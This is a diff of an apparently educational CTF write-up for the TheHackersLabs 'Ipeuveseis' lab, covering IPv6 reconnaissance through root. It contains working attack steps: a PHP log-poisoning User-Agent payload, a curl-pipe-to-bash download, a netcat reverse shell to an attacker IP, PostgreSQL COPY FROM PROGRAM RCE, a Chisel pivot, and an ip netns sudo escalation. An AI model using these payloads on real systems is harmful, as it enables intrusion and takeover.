@@ -2,37 +2,29 @@
 title: "TheHackersLabs Ipeuveseis Writeup"
 date: 2026-04-19 12:53:00 +0000
 categories: [TheHackersLabs, Writeups]
-tags: [thehackerslabs, ctf, ipv6, privilege-escalation, rce]
+tags: [thehackerslabs, ctf, ipv6, privilege-escalation, rce, postgresql, chisel, proxychains]
 description: "Complete walkthrough of exploiting an IPv6-based infrastructure, from reconnaissance through privilege escalation using network namespaces."
 image:
   path: /assets/img/posts/thehackerslabs/ipeuveseis/ipeuveseis.png
 ---
 
-## Overview
+The **Ipeuveseis** machine is a challenge focused on **IPv6 exploitation and privilege escalation**. The attack path involves discovering IPv6 neighbors, brute-forcing a web portal, extracting PostgreSQL credentials from application config files, achieving RCE via `COPY FROM PROGRAM`, pivoting through an isolated internal network using Chisel and Proxychains, solving an EUI-64 MAC-to-IPv6 conversion challenge to unlock an API command execution endpoint, and finally escalating to root by abusing `sudo` access to the `ip` binary through network namespace manipulation.
 
-Ipeuveseis is a challenge focused on **IPv6 exploitation and privilege escalation**. The attack path involves:
-1. IPv6 reconnaissance and port scanning
-2. Web application brute-forcing
-3. Extracting database credentials from application files
-4. Remote code execution via PostgreSQL
-5. Lateral movement through an isolated IPv6 network
-6. Privilege escalation using network namespaces
-
----
-
-## Phase 1: Reconnaissance
+## Enumeration
 
 ### Discovering IPv6 Neighbors
 
-The first step is to enumerate the local IPv6 neighbors attached to our interface to identify the target's link-local IPv6 address.
+We begin by enumerating the local IPv6 neighbors attached to our interface to identify the target's link-local IPv6 address.
 
 ```bash
 ┌──(suraxddq㉿kali)-[~]
 └─$ ip -6 neigh show dev eth1
+fe80::be24:11ff:fe33:c223 lladdr bc:24:11:33:c2:23 STALE 
+fe80::be24:11ff:feb3:eb49 lladdr bc:24:11:b3:eb:49 STALE 
 fe80::a00:27ff:fe7c:f878 lladdr 08:00:27:7c:f8:78 router STALE 
 ```
-
-**Key Finding:** The target machine (fe80::a00:27ff:fe7c:f878) is identified and marked as a router on the network.
+<br>
+The target machine at `fe80::a00:27ff:fe7c:f878` is identified and marked as a **router** on the network, distinguishing it from other neighbors.
 
 ### Port Scanning via IPv6
 
@@ -63,14 +55,12 @@ Read data files from: /usr/share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
            Raw packets sent: 65536 (4.194MB) | Rcvd: 65536 (3.932MB)
 ```
+<br>
+The scan reveals two open ports: **22 (SSH)** and **8080 (HTTP)**. The web service on port 8080 will be our initial entry point.
+<br>
+<br>
 
-**Discovered Services:**
-- **Port 22/tcp:** SSH (for potential direct access)
-- **Port 8080/tcp:** HTTP web service (our entry point)
-
----
-
-## Phase 2: Web Application Access
+## Web Application Access
 
 ### Port Forwarding for Convenience
 
@@ -81,10 +71,12 @@ To interact with the IPv6 web service using standard tools and a browser, we for
 └─$ sudo socat TCP6-LISTEN:8082,fork TCP6:[fe80::a00:27ff:fe7c:f878%eth1]:8080 &
 [2] 5028
 ```
-
+<br>
 This allows us to access the service at `127.0.0.1:8082` as if it were a local IPv4 service.
 
 ![Login Portal](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125000625.png)
+<br>
+<br>
 
 ### Brute-forcing the Login
 
@@ -104,32 +96,64 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-24 09:52:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-24 09:53:12
 ```
+<br>
 
-**Credentials Found:**
 - **Username:** admin
 - **Password:** admin123
 
-After logging in with these credentials, we gain access to the admin dashboard:
+After logging in with these credentials, we gain access to the admin dashboard. The portal displays the admin's profile information and provides two key links: **System Logs** and **About Us**.
 
 ![Admin Dashboard](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001056.png)
+<br><br>
+The "About Us" page reveals valuable infrastructure details, including the internal network architecture (`fd00:dead:beef::/64`), team members (System Administrator, Database Admin, Backup Operations), and the PHP version (**8.2.30**) running on the server.
 
-![User Profile](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001119.png)
+![About Page](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001119.png)
+<br>
+<br>
 
-![About Page](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001301.png)
+## Exploitation — Log Poisoning
 
-![About Page](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001431.png)
+### Discovering the Log Viewer
 
-![About Page](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001916.png)
+Navigating to the **System Logs** link, we find a log viewer at `logs.php?log=access` that renders the web server's access logs directly in the browser. Crucially, the log entries include the **User-Agent** header from each request — and the page is being rendered by PHP. This is a classic setup for a **Log Poisoning** attack.
 
----
+![System Logs Viewer](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001301.png)
+<br><br>
 
-## Phase 3: Exploitation - Database Enumeration
+### Testing PHP Code Injection via User-Agent
 
-### Discovering Database Credentials
+Using **Burp Suite Repeater**, we craft a request to `index.php` with a malicious `User-Agent` header containing a PHP `system()` call. When the log viewer subsequently renders this log entry, the PHP code is executed server-side.
 
-With access to the admin account, we explore the web application's directory structure. The application is running as the `www-data` user, which grants us access to application configuration files.
+We start with a simple `ls -ltr` command to confirm code execution:
 
-Looking inside the `/var/www/config` directory, we discover a `database.php` file containing PostgreSQL credentials:
+```
+User-Agent: <?php system('ls -ltr'); ?>
+```
+
+The access log now contains our injected PHP payload. When the `logs.php` page renders the log file, the embedded PHP code executes, and we can see the directory listing output — confirming **Remote Code Execution** as `www-data`.
+
+![Log Poisoning - ls command](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001431.png)
+<br><br>
+
+### Weaponizing the Log Poisoning for a Reverse Shell
+
+With code execution confirmed, we escalate by injecting a payload that downloads and executes a reverse shell script from our attacker machine. We set up a Python HTTP server to host the payload and a Netcat listener to catch the shell.
+
+We inject the following User-Agent:
+
+```
+User-Agent: <?php system('curl 192.168.0.11/m |bash'); ?>
+```
+
+The target fetches our payload file `m` and pipes it to `bash`, triggering a reverse shell connection back to our listener as `www-data`.
+
+![Log Poisoning - Reverse Shell](/assets/img/posts/thehackerslabs/ipeuveseis/Pasted_image_20260125001916.png)
+<br>
+<br>
+
+## Post-Exploitation — Database Credential Discovery
+
+With a shell as `www-data`, we explore the web application's directory structure. Inside the `/var/www/config` directory, we discover a `database.php` file containing hardcoded PostgreSQL credentials for both a regular user and a **superadmin** account.
 
 ```bash
 www-data@ctf:/var/www/config$ ls -l
@@ -178,27 +202,28 @@ function getDbConnection() {
     }
 }
 ```
+<br>
+Key findings from this configuration file:
 
-**Critical Findings:**
-- **PostgreSQL Host:** fd00:1337:1::20 (IPv6 address on an isolated network)
-- **Port:** 5432 (standard PostgreSQL)
-- **Superadmin User:** superadmin
-- **Superadmin Password:** jHt9b8u5whZ55551zlY1
+- **PostgreSQL Host:** `fd00:1337:1::20` (an IPv6 address on an isolated internal network)
+- **Superadmin User:** `superadmin`
+- **Superadmin Password:** `jHt9b8u5whZ55551zlY1`
 
-The presence of a `superadmin` account with hardcoded credentials is a security risk that we'll exploit for remote code execution.
+The presence of a `superadmin` account with hardcoded credentials is a critical security flaw that we'll exploit for remote code execution via PostgreSQL's `COPY FROM PROGRAM` feature.
+<br>
+<br>
 
----
-
-## Phase 4: Remote Code Execution via PostgreSQL
+## Exploitation — Remote Code Execution via PostgreSQL
 
 ### Testing RCE via the COPY Command
 
-PostgreSQL's `COPY FROM PROGRAM` feature allows executing system commands. We create a PHP script to test command execution using the superadmin credentials:
+PostgreSQL's `COPY FROM PROGRAM` feature allows executing system commands when used with superuser credentials. We create a PHP script to test command execution using the discovered superadmin credentials.
 
 ```bash
 cat > /tmp/rce.php << 'EOF'
 <?php
 $pdo = new PDO("pgsql:host=fd00:1337:1::20;port=5432;dbname=postgres", "superadmin", "jHt9b8u5whZ55551zlY1");
+
 
 $pdo->exec("CREATE TEMP TABLE test (result text)");
 $pdo->exec("COPY test FROM PROGRAM 'whoami'");
@@ -210,19 +235,18 @@ $pdo->exec("DROP TABLE test");
 ?>
 EOF
 ```
-
-Executing this script confirms code execution:
+<br>
+Executing this script confirms code execution as the `postgres` user:
 
 ```bash
 www-data@ctf:/tmp$ php rce.php 
 result: postgres
 ```
-
-**Success!** Commands execute with the privileges of the PostgreSQL `postgres` user.
+<br>
 
 ### Enumerating Files on the Database Server
 
-Next, we enhance our script to discover available files, particularly looking for SSH keys we can leverage for lateral movement:
+Next, we enhance our script to discover available files on the database server, particularly looking for SSH keys we can leverage for lateral movement.
 
 ```bash
 cat > /tmp/rce.php << 'EOF'
@@ -257,65 +281,128 @@ try {
 EOF
 ```
 
-Output:
-
-```bash
+```
 www-data@ctf:/tmp$ php rce.php 
 - /home/postgres/.ssh/id_rsa.pub
 - /home/postgres/.ssh/id_rsa
 ```
+<br>
+SSH keys exist for the `postgres` user on the database server, providing a clear path for lateral movement into the isolated network.
+<br>
+<br>
 
-**Key Discovery:** SSH keys exist for the postgres user, confirming we can pivot further.
+## Lateral Movement
 
----
+### Setting up a Chisel Tunnel
 
-## Phase 5: Lateral Movement
+The database server (`fd00:1337:1::20`) resides on an isolated IPv6 network that our attack machine cannot directly access. We establish a reverse SOCKS proxy using **Chisel** to route traffic through our compromised web server.
 
-### Setting up Chisel Tunnel
-
-The database server (fd00:1337:1::20) is on an isolated IPv6 network that our attack machine cannot directly access. We establish a reverse SOCKS proxy using Chisel to route traffic through our web-accessible compromise.
-
-**On our Kali machine:**
+On our Kali machine, we start the Chisel server:
 
 ```bash
-┌──(suraxddq㉿kali)-[~/Downloads/chisel]
+┌──(suraxddq㉿kali)-[~]
 └─$ ./chi server -p 4234 --reverse
 2026/01/24 13:23:50 server: Reverse tunnelling enabled
 2026/01/24 13:23:50 server: Fingerprint wnKQXCtFJTDuOPrhVlyNEzYwZA+tJ32Pg//83kl3Vbk=
 2026/01/24 13:23:50 server: Listening on http://0.0.0.0:4234
 2026/01/24 13:23:51 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
 ```
+<br>
 
-This creates a reverse tunnel listening on port 1080 on our local machine, through which we can route traffic to the isolated IPv6 network.
+### Connecting the Chisel Client
 
----
+From the compromised web server, we start the Chisel client connecting back to our Kali machine, creating the reverse SOCKS tunnel on port 1080.
 
-## Phase 6: MAC to IPv6 Challenge
+```bash
+www-data@ctf:/var/www/html$ ./chi client -v 192.168.0.11:4234 R:1080:socks
+2026/01/24 15:46:51 client: Connecting to ws://192.168.0.11:4234
+2026/01/24 15:46:51 client: Handshaking...
+2026/01/24 15:46:51 client: Sending config
+2026/01/24 15:46:51 client: Connected (Latency 302.648µs)
+2026/01/24 15:46:51 client: tun: SSH connected
+```
+<br>
 
-### Understanding the Challenge
+### SSH as backupuser via Proxychains
 
-After further exploration, we discover an API service (fd00:dead:beef::1:8081) that implements a security challenge: converting MAC addresses to their EUI-64 IPv6 equivalents and submitting them for validation.
+With the tunnel established on port 1080, we use `proxychains` to SSH into the database server's internal IPv6 address (`fd00:dead:beef::30`) using the extracted `id_rsa` key for the `backupuser` account. Note the `-T` flag is required to prevent the session from hanging.
 
-The challenge documentation:
+```bash
+┌──(suraxddq㉿kali)-[~]
+└─$ proxychains ssh -6 -i id_rsa backupuser@fd00:dead:beef::30 -T  
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  fd00:dead:beef::30:22  ...  OK
+id
+uid=1000(backupuser) gid=1000(backupuser) groups=1000(backupuser)
+```
+<br>
+We successfully land on the internal database server as `backupuser`, giving us a foothold deeper inside the isolated network.
 
-```json
+### Enumerating Internal Services
+
+From our SSH session as `backupuser`, we write a quick bash loop to scan for HTTP services on the `fd00:dead:beef::1` host, discovering services on ports **8080** and **8081**.
+
+```bash
+┌──(suraxddq㉿kali)-[~]
+└─$ proxychains ssh -6 -i id_rsa backupuser@fd00:dead:beef::30 -T
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  fd00:dead:beef::30:22  ...  OK
+for port in {5000..9999}; do   curl -6 http://[fd00:dead:beef::1]:$port >/dev/null 2>&1 && echo "HTTP $port opened"; done
+HTTP 8080 opened
+HTTP 8081 opened
+```
+<br>
+<br>
+
+## MAC-to-IPv6 Challenge
+
+### Analyzing the Internal API
+
+We query port 8081 and receive a JSON response outlining an API challenge: we must convert a set of MAC addresses to their EUI-64 IPv6 equivalents before gaining access to a command execution endpoint.
+
+```bash
+curl -6 -s -m 2 http://[fd00:dead:beef::1]:8081
 {
+  "message": "IPv6 CTF API",
   "challenge": {
-    "description": "Convert all given MAC addresses to their EUI-64 IPv6 equivalents (fe80::/10 prefix). The service requires validation of ALL MAC addresses before granting command execution access.",
-    "mac_list": [
+    "description": "Convert the following MAC addresses to IPv6 using EUI-64 format",
+    "mac_addresses": [
       "00:11:22:33:44:55",
       "AA:BB:CC:DD:EE:FF",
       "12:34:56:78:9A:BC",
       "DE:AD:BE:EF:CA:FE",
       "01:23:45:67:89:AB"
     ],
-    "requirements": [
-      "You must send ALL MAC addresses from the challenge list above",
-      "You must send the same number of IPv6 addresses as MAC addresses",
-      "The order of MAC addresses and IPv6 addresses must match",
-      "All conversions must be correct to proceed",
-      "Use Content-Type: application/json header"
-    ]
+    "total_macs": 5,
+    "instructions": {
+      "step1": "Convert each MAC address to IPv6 using EUI-64 format. Use the standard IPv6 link-local prefix",
+      "step2": "Send a POST request to /validate with the following JSON structure:",
+      "request_structure": {
+        "mac_addresses": "Array of all MAC addresses from the challenge (in the same order)",
+        "ipv6_addresses": "Array of corresponding IPv6 addresses (one for each MAC, in the same order)"
+      },
+      "example_request": {
+        "mac_addresses": [
+          "11:22:33:44:55:66",
+          "FF:EE:DD:CC:BB:AA"
+        ],
+        "ipv6_addresses": [
+          "fe80::1322:33ff:fe44:5566",
+          "fe80::ffee:ddff:fecc:bbaa"
+        ]
+      },
+      "requirements": [
+        "You must send ALL MAC addresses from the challenge list above",
+        "You must send the same number of IPv6 addresses as MAC addresses",
+        "The order of MAC addresses and IPv6 addresses must match",
+        "All conversions must be correct to proceed",
+        "Use Content-Type: application/json header"
+      ]
+    }
   },
   "endpoints": {
     "/validate": {
@@ -348,10 +435,11 @@ The challenge documentation:
   }
 }
 ```
+<br>
 
 ### Solving the MAC-to-IPv6 Challenge
 
-We submit all MAC addresses with their corresponding EUI-64 IPv6 addresses to the `/validate` endpoint:
+We convert all five MAC addresses to their EUI-64 IPv6 equivalents and submit them to the `/validate` endpoint. The EUI-64 conversion involves splitting the MAC at the midpoint, inserting `FF:FE`, and flipping the 7th bit of the first octet.
 
 ```bash
 curl -6 -X POST http://[fd00:dead:beef::1]:8081/validate \
@@ -373,10 +461,11 @@ curl -6 -X POST http://[fd00:dead:beef::1]:8081/validate \
     ]
   }'
 ```
+<br>
 
 ### Verifying Validation Status
 
-We check the `/status` endpoint to confirm all MACs were correctly validated:
+We check the `/status` endpoint to confirm all MAC translations were correctly accepted.
 
 ```bash
 curl -6 -s http://[fd00:dead:beef::1]:8081/status
@@ -388,16 +477,16 @@ curl -6 -s http://[fd00:dead:beef::1]:8081/status
   "message": "All MACs validated"
 }
 ```
+<br>
+All five MACs are validated and the API is now ready for command execution.
+<br>
+<br>
 
-**Status:** Ready for command execution!
-
----
-
-## Phase 7: Remote Code Execution on API Server
+## Remote Code Execution on API Server
 
 ### Testing Command Execution
 
-Now that the challenge is solved, we have access to the `/execute` endpoint. We test it with a simple `whoami` command:
+Now that the challenge is solved, we have access to the `/execute` endpoint. We test it with a simple `whoami` command.
 
 ```bash
 curl -6 -sX POST http://[fd00:dead:beef::1]:8081/execute \
@@ -411,25 +500,26 @@ curl -6 -sX POST http://[fd00:dead:beef::1]:8081/execute \
   "stderr": ""
 }
 ```
-
-**Discovery:** Commands execute as the `lenam` user (not root).
+<br>
+Commands execute as the `lenam` user. We proceed to obtain an interactive shell.
 
 ### Triggering a Reverse Shell
 
-We execute a Netcat reverse shell payload to gain interactive access:
+We execute a Netcat reverse shell payload through the API to gain interactive access.
 
 ```bash
 curl -6 -X POST http://[fd00:dead:beef::1]:8081/execute \
   -H "Content-Type: application/json" \
   -d '{"command": "nc 192.168.0.11 5555 -e /bin/bash"}'
 ```
+<br>
 
 ### Catching the Reverse Shell
 
-On our attack machine, we listen for the incoming connection:
+On our attack machine, we listen for the incoming connection and catch the shell as `lenam`. We immediately upgrade to a fully interactive TTY using the `script` trick.
 
 ```bash
-┌──(suraxddq㉿kali)-[~/Downloads/chisel]
+┌──(suraxddq㉿kali)-[~]
 └─$ nc -nvlp 5555
 listening on [any] 5555 ...
 connect to [192.168.0.11] from (UNKNOWN) [192.168.0.13] 49552
@@ -439,23 +529,21 @@ script /dev/null -c bash
 Script iniciado, el fichero de anotación de salida es '/dev/null'.
 lenam@TheHackersLabs-ipeuveseis:~$
 ```
-
-**Access Gained:** Interactive shell as user `lenam`
-
-### Capturing the User Flag
+<br>
+We have interactive access as `lenam` and can now retrieve the user flag.
 
 ```bash
 lenam@TheHackersLabs-ipeuveseis:~$ cat user.txt 
 e557d3b***
 ```
+<br>
+<br>
 
----
-
-## Phase 8: Stabilizing Access
+## Stabilizing Access
 
 ### Generating SSH Keys for Persistence
 
-For a more stable and interactive session, we generate new SSH keys:
+For a more stable and fully interactive session, we generate a new SSH keypair for `lenam` and add it to `authorized_keys`.
 
 ```bash
 lenam@TheHackersLabs-ipeuveseis:~$ ssh-keygen 
@@ -481,19 +569,20 @@ The key's randomart image is:
 |. .    .    +. +o|
 +----[SHA256]-----+
 ```
+<br>
 
-### Establishing SSH Connection
+### Establishing a Stable SSH Connection
 
-We now connect directly via SSH using IPv6:
+We now connect directly via SSH using IPv6, giving us a proper interactive session.
 
 ```bash
-┌──(suraxddq㉿kali)-[~/Downloads/chisel]
+┌──(suraxddq㉿kali)-[~]
 └─$ ssh -6 lenam@fe80::a00:27ff:fe7c:f878%eth1             
 
 Linux TheHackersLabs-ipeuveseis 6.12.57+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.57-1 (2025-11-05) x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms are described in the
+the exact distribution terms for each program are described in the
 individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
@@ -501,14 +590,14 @@ permitted by applicable law.
 Last login: Sat Jan 24 17:18:24 2026 from fe80::a41e:8bac:4959:745d%enp0s3
 lenam@TheHackersLabs-ipeuveseis:~$
 ```
+<br>
+<br>
 
----
-
-## Phase 9: Privilege Escalation
+## Privilege Escalation
 
 ### Discovering Sudo Permissions
 
-We check what commands `lenam` can execute with elevated privileges:
+We check what commands `lenam` can execute with elevated privileges.
 
 ```bash
 lenam@TheHackersLabs-ipeuveseis:~$ sudo -l
@@ -519,31 +608,19 @@ User lenam may run the following commands on TheHackersLabs-ipeuveseis:
     (ALL) NOPASSWD: /root/stack/scripts/block-web-host-access.sh, /root/stack/scripts/remove-web-host-block.sh
     (root) NOPASSWD: /usr/sbin/ip
 ```
-
-**Critical Finding:** The user `lenam` can run `/usr/sbin/ip` as root without a password. This command allows manipulation of network namespaces, which we can exploit.
+<br>
+The user `lenam` can run `/usr/sbin/ip` as **root** without a password. The `ip` command manages network namespaces among other things, and this can be exploited to gain a root shell.
 
 ### Exploiting Network Namespaces for Root Access
 
-The `ip netns` command (part of `/usr/sbin/ip`) allows creating and managing network namespaces. We can exploit this to escape the current user context by creating a namespace and accessing the root namespace:
+The `ip netns` command allows creating and managing network namespaces. We exploit this by creating a namespace, then symlinking it to PID 1's network namespace (the init process, which runs as root). When we execute a shell within that namespace context via `sudo ip netns exec`, we inherit **root privileges**.
 
-```bash
+```
 lenam@TheHackersLabs-ipeuveseis:~$ sudo ip netns add foo
 lenam@TheHackersLabs-ipeuveseis:~$ sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
 lenam@TheHackersLabs-ipeuveseis:~$ sudo ip netns exec bar /bin/sh
 # id
 uid=0(root) gid=0(root) grupos=0(root)
-```
-
-**Explanation:**
-1. We create a new namespace called "foo"
-2. We create a symlink to `/proc/1/ns/net` (the namespace of the init process, which runs as root)
-3. When we execute a shell within this namespace context, we gain root privileges
-
-### Capturing the Root Flag
-
-```bash
 # cat root.txt
-85731848****
+85731****
 ```
-
----
